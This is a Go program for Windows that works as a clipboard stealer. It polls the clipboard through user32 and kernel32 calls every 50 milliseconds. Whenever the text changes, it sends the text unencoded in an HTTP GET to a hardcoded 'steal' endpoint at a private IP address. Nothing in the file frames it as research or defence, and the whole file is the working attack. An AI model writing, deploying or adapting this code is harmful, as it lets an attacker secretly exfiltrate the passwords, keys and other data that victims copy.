package main

import (
	"fmt"
	"net/http"
	"syscall"
	"time"
	"unsafe"
)

const (
	cfText        = 1
	cfUnicodeText = 13
)

var (
	// DLL Imports
	user32   = syscall.MustLoadDLL("user32.dll")
	kernel32 = syscall.MustLoadDLL("kernel32.dll")

	// Function Imports
	openClipboard              = user32.MustFindProc("OpenClipboard")
	closeClipboard             = user32.MustFindProc("CloseClipboard")
	getClipboardData           = user32.MustFindProc("GetClipboardData")
	isClipboardFormatAvailable = user32.MustFindProc("IsClipboardFormatAvailable")

	globalLock   = kernel32.MustFindProc("GlobalLock")
	globalUnlock = kernel32.MustFindProc("GlobalUnlock")

	url      = "http://192.168.0.212:80/steal?data="
	lastSent = ""
)

func getClip() string {
	openClipboard.Call(0)
	formatAvailable, _, _ := isClipboardFormatAvailable.Call(cfText)
	if formatAvailable == 0 {
	}
	handle, _, _ := getClipboardData.Call(cfUnicodeText)
	check(handle)

	lock, _, _ := globalLock.Call(handle)
	check(lock)
	data := syscall.UTF16ToString((*[1 << 20]uint16)(unsafe.Pointer(lock))[:])

	kek, _, _ := globalUnlock.Call(handle)
	check(kek)
	closeClipboard.Call()
	return data
}

func compare(a, b string) int {
	if a == b {
		return 0
	}
	if a > b {
		return 1
	}
	return -1
}

func check(check uintptr) {
	if check == 0 {
		closeClipboard.Call()
	} else {

	}
}

func sendData(data string) {
	req, err := http.NewRequest("GET", url+data, nil)
	if err != nil {
		fmt.Printf("Error: %s", err)
	}
	res, _ := http.DefaultClient.Do(req)
	res.Body.Close()
}

func main() {
	for {
		time.Sleep(time.Millisecond * 50)
		closeClipboard.Call()
		clippy, _, _ := openClipboard.Call(0)

		if clippy == 0 {
			fmt.Println("Clipboard is empty")
		} else {
			data := getClip()
			if compare(data, lastSent) != 0 {
				fmt.Printf("Clipboard changed: %s\n", data)
				lastSent = data
				sendData(data)
			} else {
			}
		}
	}
}
